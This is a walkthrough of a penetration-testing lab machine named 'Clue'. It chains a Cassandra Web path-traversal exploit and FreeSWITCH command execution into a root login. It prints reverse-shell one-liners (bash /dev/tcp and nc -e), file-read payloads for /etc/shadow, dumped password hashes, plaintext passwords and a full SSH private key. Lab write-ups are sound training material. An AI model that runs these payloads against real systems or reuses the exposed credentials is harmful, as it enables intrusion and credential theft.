`autonmap -H 192.168.190.240 -t all`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`80/tcp   open  http`
`3000/tcp open  ppp`
`8021/tcp open  ftp-proxy`

`---------------------Starting Script Scan-----------------------`

`PORT     STATE SERVICE          VERSION`
`22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)`
`| ssh-hostkey:` 
`|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)`
`|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)`
`|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)`
`80/tcp   open  http             Apache httpd 2.4.38`
`|_http-title: 403 Forbidden`
`|_http-server-header: Apache/2.4.38 (Debian)`
`3000/tcp open  http             Thin httpd`
`|_http-server-header: thin`
`|_http-title: Cassandra Web`
`8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket`
`Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel`

Looking at Cassandra Web on port 3000 we can execute CQL

![](Pasted%20image%2020240209155042.png)

But our user doesn't have authorization to read any of the "good" tables.

Go to google and just search Cassandra Web exploitdb

![](Pasted%20image%2020240209155201.png)

https://www.exploit-db.com/exploits/49362
Reading what the exploit does, if we can read /proc/self/cmdline, we can get the user's password

`└─$ python 49362.py 192.168.190.240 /proc/self/cmdline`                

`/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330`

Try and fail to ssh with these credentials unfortunately

Read /etc/passwd

`└─$ python 49362.py 192.168.190.240 '../../../../../../../../../../etc/passwd'`

`root:x:0:0:root:/root:/bin/bash`
`daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`
`bin:x:2:2:bin:/bin:/usr/sbin/nologin`
`sys:x:3:3:sys:/dev:/usr/sbin/nologin`
`sync:x:4:65534:sync:/bin:/bin/sync`
`games:x:5:60:games:/usr/games:/usr/sbin/nologin`
`man:x:6:12:man:/var/cache/man:/usr/sbin/nologin`
`lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin`
`mail:x:8:8:mail:/var/mail:/usr/sbin/nologin`
`news:x:9:9:news:/var/spool/news:/usr/sbin/nologin`
`uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin`
`proxy:x:13:13:proxy:/bin:/usr/sbin/nologin`
`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`
`backup:x:34:34:backup:/var/backups:/usr/sbin/nologin`
`list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin`
`irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin`
`gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin`
`nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`
`_apt:x:100:65534::/nonexistent:/usr/sbin/nologin`
`systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin`
`systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin`
`systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin`
`messagebus:x:104:110::/nonexistent:/usr/sbin/nologin`
`sshd:x:105:65534::/run/sshd:/usr/sbin/nologin`
`systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin`
`ntp:x:106:113::/nonexistent:/usr/sbin/nologin`
`cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin`
`cassie:x:1000:1000::/home/cassie:/bin/bash`
`freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false`
`anthony:x:1001:1001::/home/anthony:/bin/bash`

There is another user - anthony

Google search on the other service found in the original nmap - FreeSwitch

![](Pasted%20image%2020240209155822.png)

Download the script from the first result but it doesn't work

The second result is a MSF exploit - reading it, it shows this about the default FreeSwitch password
![](Pasted%20image%2020240209155938.png)

Go to the link and it describes more about how this config file sets up the password
![](Pasted%20image%2020240209160108.png)

Google to find out the base for the application
![](Pasted%20image%2020240209160246.png)

Let's try to read this file to double check the password
`└─$ python 49362.py 192.168.190.240 '../../../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml'`

`<configuration name="event_socket.conf" description="Socket Client">`
  `<settings>`
    `<param name="nat-map" value="false"/>`
    `<param name="listen-ip" value="0.0.0.0"/>`
    `<param name="listen-port" value="8021"/>`
    `<param name="password" value="StrongClueConEight021"/>`
  `</settings>`
`</configuration>`

The password is different than the default one so let's update it in our other script
![](Pasted%20image%2020240209160519.png)

`└─$ python 47799.py 192.168.190.240 'whoami'`                                                                      
`Authenticated`
`Content-Type: api/response`
`Content-Length: 11`

`freeswitch`

It worked! We now have RCE. 

Try to get a reverse shell. Use one of the open ports.
`└─$ python 47799.py 192.168.190.240 '/bin/bash -i >& /dev/tcp/192.168.45.235/3000 0>&1'`
`Authenticated`
`Content-Type: api/response`
`Content-Length: 14`

`-ERR no reply`
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Clue]`
`└─$ python 47799.py 192.168.190.240 'nc 192.168.45.235 3000 -e /bin/bash'`              
`Authenticated`

nc works and we get the shell. Upgrade it.
`└─$ nc -nlvp 3000`                             
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:3000`
`Ncat: Listening on 0.0.0.0:3000`
`Ncat: Connection from 192.168.190.240:45696.`
`python -c 'import pty; pty.spawn("/bin/bash")'`
`freeswitch@clue:/$`

Try to switch to cassie since we have the credentials.
`freeswitch@clue:/$ su cassie`
`su cassie`
`Password: SecondBiteTheApple330`

`cassie@clue:/$` 

Check if cassie can sudo anything without a password
`cassie@clue:/$ sudo -l`
`sudo -l`
`Matching Defaults entries for cassie on clue:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin`

`User cassie may run the following commands on clue:`
    `(ALL) NOPASSWD: /usr/local/bin/cassandra-web`

Let's see what this program can do

`cassie@clue:/$ sudo /usr/local/bin/cassandra-web`
`sudo /usr/local/bin/cassandra-web`
`I, [2024-02-09T16:14:24.594591 #24194]  INFO -- : Establishing control connection`
`W, [2024-02-09T16:14:24.601388 #24194]  WARN -- : Host 127.0.0.1 refused all connections`
`Cassandra::Errors::AuthenticationError: Server requested authentication, but client was not configured to authenticate`

`Usage: cassandra-web [options]`
    `-B, --bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)`
    `-H, --hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)`
    `-P, --port PORT                  integer port that cassandra is running on (default: 9042)`
    `-L, --log-level LEVEL            log level (default: info)`
    `-u, --username USER              username to use when connecting to cassandra`
    `-p, --password PASS              password to use when connecting to cassandra`
    `-C, --compression NAME           compression algorithm to use (lz4 or snappy)`
        `--server-cert PATH           server ceritificate pathname`
        `--client-cert PATH           client ceritificate pathname`
        `--private-key PATH           path to private key`
        `--passphrase SECRET          passphrase for the private key`
    `-h, --help                       Show help`

Having access to Cassandra Web we can read any file that it can. That means if we sudo another instance we can read any file.

We start another instance with sudo
`cassie@clue:/tmp$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330`
`<b -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330`
`I, [2024-02-09T16:22:56.868906 #24251]  INFO -- : Establishing control connection`
`I, [2024-02-09T16:22:56.945094 #24251]  INFO -- : Refreshing connected host's metadata`
`I, [2024-02-09T16:22:56.948574 #24251]  INFO -- : Completed refreshing connected host's metadata`
`I, [2024-02-09T16:22:56.949261 #24251]  INFO -- : Refreshing peers metadata`
`I, [2024-02-09T16:22:56.950245 #24251]  INFO -- : Completed refreshing peers metadata`
`I, [2024-02-09T16:22:56.950278 #24251]  INFO -- : Refreshing schema`
`I, [2024-02-09T16:22:56.984514 #24251]  INFO -- : Schema refreshed`
`I, [2024-02-09T16:22:56.984567 #24251]  INFO -- : Control connection established`
`I, [2024-02-09T16:22:56.984775 #24251]  INFO -- : Creating session`
`I, [2024-02-09T16:22:57.128945 #24251]  INFO -- : Session created`
`2024-02-09 16:22:57 -0500 Thin web server (v1.8.1 codename Infinite Smoothie)`
`2024-02-09 16:22:57 -0500 Maximum connections set to 1024`
`2024-02-09 16:22:57 -0500 Listening on 0.0.0.0:4444, CTRL+C to stop`

We can't contact it from our attack machine. Trying a couple other ports it doesn't work so there has to be a firewall.

Let's try to just curl it to make sure the server did actually start.

`freeswitch@clue:/$ curl 127.0.0.1:4444`
`curl 127.0.0.1:4444`
`<!DOCTYPE html>`
`<html lang="en" ng-app="cassandra">`
  `<head>`
    `<base href="/">`
    `<meta charset="utf-8">`
    `<meta http-equiv="X-UA-Compatible" content="IE=edge">`
    `<meta name="viewport" content="width=device-width, initial-scale=1">`
    `<title>Cassandra Web</title>`

    `<!-- Bootstrap -->`
    `<link rel="stylesheet" href="/css/bootstrap.css">`
    `<link rel="stylesheet" href="/css/bootstrap-theme.css">`

    `<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->`
    `<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->`
    `<!--[if lt IE 9]>`
      `<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>`
      `<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>`
    `<![endif]-->`

    `<!-- CodeMirror -->`
    `<link rel="stylesheet" href="/css/codemirror.css">`
    `<link rel="stylesheet" href="/css/codemirror-solarized.css">`
    `<!-- Prism -->`
    `<link rel="stylesheet" href="/css/prism.css">`

    `<!-- Cassandra Web -->`
    `<link rel="stylesheet" href="/css/style.css">`
  `</head>`
  `<body ng-controller="main">`
    `<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">`
      `<div class="container-fluid">`
        `<div class="navbar-header">`
          `<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">`
            `<span class="sr-only">Toggle navigation</span>`
            `<span class="icon-bar"></span>`
            `<span class="icon-bar"></span>`
            `<span class="icon-bar"></span>`
          `</button>`
          `<a class="navbar-brand" href="/">Cassandra Web</a>`
        `</div>`
        `<div class="navbar-collapse collapse">`
          `<ul class="nav navbar-nav navbar-right">`
            `<li><a class="btn btn-lg" ng-click="show_execute_form()">Execute <span class="glyphicon glyphicon-edit"></span></a></li>`
          `</ul>`
        `</div>`
      `</div>`
    `</div>`

    `<div class="container-fluid">`
      `<div class="row">`
        `<div class="col-sm-3 col-md-2 sidebar">`
          `<section>`
            `<h2>Keyspaces</h2>`
            `<ul class="nav nav-pills nav-stacked nav-sidebar">`
              `<li ng-repeat="keyspace in cluster.keyspaces" ng-class="keyspace_class(keyspace)">`
                `<a href="/{{keyspace.name}}">{{keyspace.name}} <span class="badge pull-right">{{keyspace.tables.length}}</span></a>`
              `</li>`
            `</ul>`
          `</section>`
          `<section>`
            `<h2>Hosts</h2>`
            `<ul class="nav nav-sidebar">`
              `<li ng-repeat="host in cluster.hosts" ng-class="host_class(host)">`
                `<span class="label label-{{host_status_class(host.status)}}">{{host.ip}} ({{host.status}})</span>`
              `</li>`
            `</ul>`
          `</section>`
        `</div>`
        `<div class="col-sm-9 col-md-10 main" ng-view>`
        `</div>`
      `</div>`
      `<!-- <div class="row">`
        `<div class="col-sm-12 col-md-12 sidebar">`
          `<h2>Execute</h2>`
          `<textarea ng-model="statement"></textarea>`
          `<button ng-click="cluster.execute(statement)">Execute</button>`
        `</div>`
      `</div> -->`
    `</div>`

    `<!-- Angular -->`
    `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular.min.js"></script>`
    `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular-route.min.js"></script>`
    `<script src="/js/angular-filter.min.js"></script>`
    `<script src="/js/ui-bootstrap-tpls.min.js"></script>`
    `<!-- CodeMirror -->`
    `<script src="/js/codemirror.js"></script>`
    `<script src="/js/codemirror-sql.js"></script>`
    `<script src="/js/ui-codemirror.js"></script>`
    `<!-- Prism -->`
    `<script src="/js/prism.js"></script>`
    `<!-- Cassandra Web -->`
    `<script src="/js/cassandra.js"></script>`
  `</body>`
`</html>`

So it did actually start. Let's try basic directory transversal.

`freeswitch@clue:/$ curl 127.0.0.1:4444/../../../../../../../../../../../../../etc/shadow`
`<4/../../../../../../../../../../../../../etc/shadow`
`<!DOCTYPE html>`
`<html lang="en" ng-app="cassandra">`
  `<head>`
    `<base href="/">`
    `<meta charset="utf-8">`
    `<meta http-equiv="X-UA-Compatible" content="IE=edge">`
    `<meta name="viewport" content="width=device-width, initial-scale=1">`
    `<title>Cassandra Web</title>`

    `<!-- Bootstrap -->`
    `<link rel="stylesheet" href="/css/bootstrap.css">`
    `<link rel="stylesheet" href="/css/bootstrap-theme.css">`

    `<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->`
    `<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->`
    `<!--[if lt IE 9]>`
      `<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>`
      `<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>`
    `<![endif]-->`

    `<!-- CodeMirror -->`
    `<link rel="stylesheet" href="/css/codemirror.css">`
    `<link rel="stylesheet" href="/css/codemirror-solarized.css">`
    `<!-- Prism -->`
    `<link rel="stylesheet" href="/css/prism.css">`

    `<!-- Cassandra Web -->`
    `<link rel="stylesheet" href="/css/style.css">`
  `</head>`
  `<body ng-controller="main">`
    `<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">`
      `<div class="container-fluid">`
        `<div class="navbar-header">`
          `<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">`
            `<span class="sr-only">Toggle navigation</span>`
            `<span class="icon-bar"></span>`
            `<span class="icon-bar"></span>`
            `<span class="icon-bar"></span>`
          `</button>`
          `<a class="navbar-brand" href="/">Cassandra Web</a>`
        `</div>`
        `<div class="navbar-collapse collapse">`
          `<ul class="nav navbar-nav navbar-right">`
            `<li><a class="btn btn-lg" ng-click="show_execute_form()">Execute <span class="glyphicon glyphicon-edit"></span></a></li>`
          `</ul>`
        `</div>`
      `</div>`
    `</div>`

    `<div class="container-fluid">`
      `<div class="row">`
        `<div class="col-sm-3 col-md-2 sidebar">`
          `<section>`
            `<h2>Keyspaces</h2>`
            `<ul class="nav nav-pills nav-stacked nav-sidebar">`
              `<li ng-repeat="keyspace in cluster.keyspaces" ng-class="keyspace_class(keyspace)">`
                `<a href="/{{keyspace.name}}">{{keyspace.name}} <span class="badge pull-right">{{keyspace.tables.length}}</span></a>`
              `</li>`
            `</ul>`
          `</section>`
          `<section>`
            `<h2>Hosts</h2>`
            `<ul class="nav nav-sidebar">`
              `<li ng-repeat="host in cluster.hosts" ng-class="host_class(host)">`
                `<span class="label label-{{host_status_class(host.status)}}">{{host.ip}} ({{host.status}})</span>`
              `</li>`
            `</ul>`
          `</section>`
        `</div>`
        `<div class="col-sm-9 col-md-10 main" ng-view>`
        `</div>`
      `</div>`
      `<!-- <div class="row">`
        `<div class="col-sm-12 col-md-12 sidebar">`
          `<h2>Execute</h2>`
          `<textarea ng-model="statement"></textarea>`
          `<button ng-click="cluster.execute(statement)">Execute</button>`
        `</div>`
      `</div> -->`
    `</div>`

    `<!-- Angular -->`
    `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular.min.js"></script>`
    `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-rc.0/angular-route.min.js"></script>`
    `<script src="/js/angular-filter.min.js"></script>`
    `<script src="/js/ui-bootstrap-tpls.min.js"></script>`
    `<!-- CodeMirror -->`
    `<script src="/js/codemirror.js"></script>`
    `<script src="/js/codemirror-sql.js"></script>`
    `<script src="/js/ui-codemirror.js"></script>`
    `<!-- Prism -->`
    `<script src="/js/prism.js"></script>`
    `<!-- Cassandra Web -->`
    `<script src="/js/cassandra.js"></script>`
  `</body>`
`</html>`

We didn't get an error message so let's add the `path-as-is` option.

`freeswitch@clue:/$ curl --path-as-is 127.0.0.1:4444/../../../../../../../../../../../../../etc/shadow`              
`<4/../../../../../../../../../../../../../etc/shadow`
`root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::`
`daemon:*:18555:0:99999:7:::`
`bin:*:18555:0:99999:7:::`
`sys:*:18555:0:99999:7:::`
`sync:*:18555:0:99999:7:::`
`games:*:18555:0:99999:7:::`
`man:*:18555:0:99999:7:::`
`lp:*:18555:0:99999:7:::`
`mail:*:18555:0:99999:7:::`
`news:*:18555:0:99999:7:::`
`uucp:*:18555:0:99999:7:::`
`proxy:*:18555:0:99999:7:::`
`www-data:*:18555:0:99999:7:::`
`backup:*:18555:0:99999:7:::`
`list:*:18555:0:99999:7:::`
`irc:*:18555:0:99999:7:::`
`gnats:*:18555:0:99999:7:::`
`nobody:*:18555:0:99999:7:::`
`_apt:*:18555:0:99999:7:::`
`systemd-timesync:*:18555:0:99999:7:::`
`systemd-network:*:18555:0:99999:7:::`
`systemd-resolve:*:18555:0:99999:7:::`
`messagebus:*:18555:0:99999:7:::`
`sshd:*:18555:0:99999:7:::`
`systemd-coredump:!!:18555::::::`
`ntp:*:19209:0:99999:7:::`
`cassandra:!:19209:0:99999:7:::`
`cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::`
`freeswitch:!:19209::::::`
`anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7:::`

We can see the hashed passwords for root and anthony now. Running them through hashcat we don't get a result unfortunately.

Let's check anthony's bash history
`freeswitch@clue:/$ curl --path-as-is 127.0.0.1:4444/../../../../../../../../../../../../../home/anthony/.bash_history`
`</../../../../../../../../home/anthony/.bash_history`
`clear`
`ls -la`
`ssh-keygen`
`cp .ssh/id_rsa.pub .ssh/authorized_keys`
`sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys`
`exit`

From this we can tell Anthony generated an SSH pair and added his public key as authorized for root. Let's see if we can view Anthony's private key.
`freeswitch@clue:/$ curl --path-as-is 127.0.0.1:4444/../../../../../../../../../../../../../home/anthony/.ssh/id_rsa`  
`<../../../../../../../../../home/anthony/.ssh/id_rsa`
`-----BEGIN OPENSSH PRIVATE KEY-----`
`b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn`
`NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe`
`d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM`
`jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m`
`B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq`
`gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/`
`DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r`
`acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE`
`QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws`
`mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP`
`HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8`
`UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y`
`etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M`
`mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i`
`CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+`
`0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG`
`Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C`
`gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG`
`krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b`
`yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys`
`kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU`
`DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN`
`Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU`
`iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj`
`4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==`
`-----END OPENSSH PRIVATE KEY-----`
`freeswitch@clue:/$`

Create the key, set the permissions, connect as root, and get the proof.txt

`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Clue]`
`└─$ mousepad id_rsa`     
                                                                                                                       
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Clue]`
`└─$ chmod 600 id_rsa`      
                                                                                                                       
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Clue]`
`└─$ ssh -i id_rsa root@192.168.190.240`          
`Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64`

`The programs included with the Debian GNU/Linux system are free software;`
`the exact distribution terms for each program are described in the`
`individual files in /usr/share/doc/*/copyright.`

`Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent`
`permitted by applicable law.`
`Last login: Fri Feb  9 15:28:32 2024 from 192.168.45.235`
`root@clue:~# cat /proof.txt`
`cat: /proof.txt: No such file or directory`
`root@clue:~# cat proof.txt`
`The proof is in another file`
`root@clue:~# ls`
`proof.txt  proof_youtriedharder.txt`
`root@clue:~# cat proof_youtriedharder.txt`
`d1cffa0c5c5cf00f2127fa2b594e9fe4`

